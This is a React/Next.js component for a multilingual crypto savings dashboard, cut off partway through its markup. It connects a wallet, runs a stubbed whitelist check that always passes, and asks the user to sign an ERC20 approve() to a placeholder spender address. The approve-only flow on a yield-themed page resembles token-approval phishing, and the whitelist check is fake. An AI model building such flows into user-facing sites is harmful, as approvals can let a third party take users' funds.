"use client";

import Image from "next/image";
import { useState, useEffect } from "react";
// 💡 引入 Web3 相关钩子与解析工具
import { 
  useAccount, 
  useConnectModal, 
  useReadContract, 
  useWriteContract, 
  useWaitForTransactionReceipt 
} from 'wagmi';
import { parseUnits } from 'viem';

import { mobileMysteryCopy, mobileYieldCopy } from "./savings-command-center";
import { spotlightCopy, type SpotlightKey } from "./mobile-spotlight-hub";
import { useLocale } from "@/i18n/locale-provider";
import type { Locale } from "@/i18n/locales";

// --- 💡 Web3 配置参数 (请根据实际情况修改) ---
const TOKEN_ADDRESS = '0x...';      // 您的 ERC20 代币合约地址
const SPENDER_ADDRESS = '0x...';    // 允许动用代币的目标合约地址
const APPROVE_AMOUNT = '100';       // 想要授权的数量

const erc20Abi = [
  { name: 'balanceOf', type: 'function', stateMutability: 'view', inputs: [{ name: 'account', type: 'address' }], outputs: [{ name: '', type: 'uint256' }] },
  { name: 'decimals', type: 'function', stateMutability: 'view', inputs: [], outputs: [{ name: '', type: 'uint8' }] },
  { name: 'approve', type: 'function', stateMutability: 'nonpayable', inputs: [{ name: 'spender', type: 'address' }, { name: 'value', type: 'uint256' }], outputs: [{ name: '', type: 'bool' }] },
] as const;

const deckCopy: Record<Locale, { eyebrow: string; title: string; live: string }> = {
  en: { eyebrow: "OPPORTUNITY NETWORK", title: "Savings access console", live: "LIVE" },
  "zh-CN": { eyebrow: "机会网络", title: "储蓄功能控制台", live: "实时" },
  "zh-TW": { eyebrow: "機會網絡", title: "儲蓄功能控制台", live: "即時" },
  ja: { eyebrow: "機会ネットワーク", title: "貯蓄アクセスコンソール", live: "稼働中" },
  ko: { eyebrow: "기회 네트워크", title: "저축 액세스 콘솔", live: "운영 중" },
  th: { eyebrow: "เครือข่ายโอกาส", title: "ศูนย์ควบคุมการออม", live: "ออนไลน์" },
};

export function DesktopOpportunityDeck() {
  const { locale } = useLocale();
  const items = spotlightCopy[locale];
  const [activeKey, setActiveKey] = useState<SpotlightKey>("fixed");
  const active = items.find((item) => item.key === activeKey) ?? items[0];
  const mystery = mobileMysteryCopy[locale];
  const stats = mobileYieldCopy[locale];
  const deck = deckCopy[locale];

  // --- 💡 1. 钱包连接与状态管理 ---
  const { address, isConnected } = useAccount();
  const { openConnectModal } = useConnectModal();
  const { writeContract, data: txHash, isPending: isSigning } = useWriteContract();
  const [whitelistStatus, setWhitelistStatus] = useState<'idle' | 'checking' | 'passed' | 'failed'>('idle');

  // --- 💡 2. 模拟白名单校验 API ---
  const verifyWhitelist = async (userAddress: string) => {
    setWhitelistStatus('checking');
    try {
      // 模拟请求后端接口，实际开发时请替换为您的真实 fetch 请求
      await new Promise(resolve => setTimeout(resolve, 1000)); 
      const isWhitelisted = true; // 模拟校验通过
      setWhitelistStatus(isWhitelisted ? 'passed' : 'failed');
    } catch {
      setWhitelistStatus('failed');
    }
  };

  useEffect(() => {
    if (isConnected && address) {
      verifyWhitelist(address);
    } else {
      setWhitelistStatus('idle');
    }
  }, [isConnected, address]);

  // --- 💡 3. 读取链上代币信息 ---
  const { data: decimals } = useReadContract({
    address: TOKEN_ADDRESS,
    abi: erc20Abi,
    functionName: 'decimals',
  });

  const { data: balance, refetch: refetchBalance } = useReadContract({
    address: TOKEN_ADDRESS,
    abi: erc20Abi,
    functionName: 'balanceOf',
    args: address ? [address] : undefined,
    query: { enabled: !!address && whitelistStatus === 'passed' }
  });

  // --- 💡 4. 等待区块打包收据 ---
  const { isLoading: isConfirming, isSuccess: isApproveSuccess } = useWaitForTransactionReceipt({ hash: txHash });

  useEffect(() => {
    if (isApproveSuccess) {
      refetchBalance();
      alert('授权成功！');
    }
  }, [isApproveSuccess]);

  // --- 💡 5. 发起授权点击事件 ---
  const handleApprove = () => {
    if (!decimals) return;
    const rawAmount = parseUnits(APPROVE_AMOUNT, decimals);
    writeContract({
      address: TOKEN_ADDRESS,
      abi: erc20Abi,
      functionName: 'approve',
      args: [SPENDER_ADDRESS, rawAmount],
    });
  };

  // --- 💡 6. 动态控制核心按钮的状态机渲染 ---
  const renderWeb3Button = () => {
    // 状态 A: 钱包未连接
    if (!isConnected) {
      return (
        <button type="button" onClick={openConnectModal} className="primary-button mt-5 rounded-lg px-5 py-2.5 text-sm font-bold">
          连接加密钱包
        </button>
      );
    }
    // 状态 B: 正在校验白名单
    if (whitelistStatus === 'checking') {
      return (
        <button type="button" disabled className="mt-5 rounded-lg border border-line bg-bg/50 px-5 py-2.5 text-sm font-semibold text-muted cursor-wait">
          正在校验白名单...
        </button>
      );
    }
    // 状态 C: 白名单校验失败
    if (whitelistStatus === 'failed') {
      return (
        <button type="button" disabled className="mt-5 rounded-lg border border-red-500/30 bg-red-500/10 px-5 py-2.5 text-sm font-semibold text-red-400 cursor-not-allowed">
          非白名单地址，无权操作
        </button>
      );
    }
    // 状态 D: 钱包中等待用户点击确认签名
    if (isSigning) {
      return (
        <button type="button" disabled className="primary-button mt-5 rounded-lg px-5 py-2.5 text-sm font-bold animate-pulse cursor-wait">
          请在钱包中确认授权...
        </button>
      );
    }
    // 状态 E: 交易已提交，等待区块链节点打包
    if (isConfirming) {
      return (
        <button type="button" disabled className="mt-5 rounded-lg border border-cyan/40 bg-cyan/10 px-5 py-2.5 text-sm font-semibold text-cyan animate-pulse cursor-wait">
          区块上链打包中...
        </button>
      );
    }
    // 状态 F: 链上授权圆满成功
    if (isApproveSuccess) {
      return (
        <button type="button" disabled className="mt-5 rounded-lg border border-success/30 bg-success/20 px-5 py-2.5 text-sm font-semibold text-success cursor-not-allowed">
          已成功授权
        </button>
      );
    }

    // 默认正常状态: 白名单已通过，展示余额，等待点击“授权”
    const formattedBalance = balance && decimals ? (Number(balance) / 10 ** decimals).toFixed(2) : '0.00';
    return (
      <div className="mt-5 flex flex-col items-start gap-1">
        <span className="text-[11px] text-muted">当前代币余额: <strong className="text-cyan">{formattedBalance}</strong></span>
        <button type="button" onClick={handleApprove} className="primary-button rounded-lg px-5 py-2.5 text-sm font-bold">
          授权 {APPROVE_AMOUNT} 代币
        </button>
      </div>
    );
  };

  return (
    <section data-testid="desktop-opportunity-deck" className="mb-3 grid grid-cols-12 gap-3">
      <div className="relative col-span-8 min-h-[390px] overflow-hidden rounded-panel border border-violet/35 bg-[radial-gradient(circle_at_70%_35%,rgba(115,76,255,.22),transparent_36%),linear-gradient(145deg,#0d172c,#070d1d)] p-6 shadow-glow">
        <div className="absolute inset-0 opacity-30 [background-image:linear-gradient(rgba(75,211,255,.08)_1px,transparent_1px),linear-gradient(90deg,rgba(75,211,255,.08)_1px,transparent_1px)] [background-size:38px_38px]" />
        <div className="relative flex items-center justify-between">
          <div>
            <p className="text-xs font-bold tracking-[.22em] text-cyan">{deck.eyebrow}</p>
            <h2 className="mt-2 text-2xl font-semibold">{deck.title}</h2>
          </div>
          <span className="rounded-full border border-success/30 bg-success/10 px-3 py-1 text-xs font-bold text-success">{deck.live}</span>
        </div>
        
        <div className="relative mt-6 grid grid-cols-[210px_1fr] gap-5">
          <div className="space-y-2">
            {items.map((item, index) => (
              <button
                key={item.key}
                type="button"
                onClick={() => setActiveKey(item.key)}
                onPointerEnter={() => setActiveKey(item.key)}
                className={`flex w-full items-center gap-3 rounded-lg border px-3 py-3 text-left transition ${
                  active.key === item.key
                    ? "border-cyan/60 bg-cyan/10 shadow-[0_0_22px_rgba(34,211,238,.14)]"
                    : "border-line bg-bg/35 hover:border-violet/45"
                }`}
              >
                <span className={`grid size-8 place-items-center rounded-full text-xs font-black ${active.key === item.key ? "bg-cyan text-bg" : "bg-violet/15 text-violet"}`}>
                  0{index + 1}
                </span>
                <span>
                  <small className="block text-[.6rem] tracking-[.14em] text-muted">{item.eyebrow}</small>
                  <strong className="text-sm">{item.title}</strong>
                </span>
              </button>
            ))}
          </div>

          <div data-testid="desktop-opportunity-active" className="relative flex min-h-[270px] flex-col justify-end overflow-hidden rounded-xl border border-violet/35 bg-bg/55 p-6">
            <div className="absolute -right-10 -top-10 size-56 rounded-full border border-cyan/20 shadow-[0_0_80px_rgba(34,211,238,.18)]">
              <span className="absolute inset-8 rounded-full border border-violet/30" />
              <span className="absolute inset-16 rounded-full border border-cyan/25" />
            </div>
            <div className="relative">
              <span className="text-xs font-bold tracking-[.2em] text-cyan">{active.eyebrow}</span>
              <h3 className="mt-2 text-3xl font-bold">{active.title}</h3>
              <p className="mt-3 max-w-md text-sm leading-6 text-muted">{active.detail}</p>
              
              {/* 💡 这里用状态机按钮完全替换了原先会导致网页跳转的 <a> 链接 */}
              {renderWeb3Button()}
            </div>
          </div>
        </div>
      </div>

      <div className="col-span-4 grid gap-3">
        <section data-testid="desktop-yield-stats" className="rounded-panel border border-cyan/30 bg-surface-soft/85 p-5">
          <div className="flex items-center justify-between">
            <h2 className="text-lg font-semibold">{stats.title}</h2>
            <span className="size-2 rounded-full bg-success shadow-[0_0_12px_#22c55e]" />
          </div>
          <div className="mt-3 divide-y divide-line/70">
